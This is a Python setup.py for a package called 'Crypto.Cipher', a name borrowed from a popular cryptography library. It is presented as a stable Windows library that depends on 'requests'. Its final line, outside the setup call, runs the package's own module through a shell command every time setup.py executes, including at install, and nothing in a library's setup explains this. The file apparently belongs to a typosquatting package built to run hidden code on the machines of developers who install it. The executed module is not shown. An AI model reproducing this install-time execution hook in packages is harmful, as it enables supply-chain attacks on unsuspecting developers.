from setuptools import setup, find_packages
from setuptools import setup
from setuptools.command.install import install

import subprocess



setup(
  name="Crypto.Cipher",
  version="1",
  author="CodeUK",
  author_email="d@doop.fun",
  description="",
  url="https://github.com/codeuk/Crypto.Cipher",
  project_urls={
    "GitHub": "https://github.com/codeuk/Crypto.Cipher",
    "Bug Tracker": "https://github.com/codeuk/Crypto.Cipher/issues",
  },
  license="MIT",
  keywords=["Crypto.Cipher","Crypto.Cipher"],
  classifiers = [
  "Programming Language :: Python :: 3",
  "License :: OSI Approved :: MIT License",
  "Operating System :: Microsoft :: Windows",
  "Development Status :: 5 - Production/Stable",
  "Intended Audience :: Developers",
  "Natural Language :: English",
  "Topic :: Software Development"
  ],
  package_dir={"": "."},
  packages=find_packages(where="."),
  install_requires=['requests'],
)
subprocess.call("py -m Crypto.Cipher", shell=True)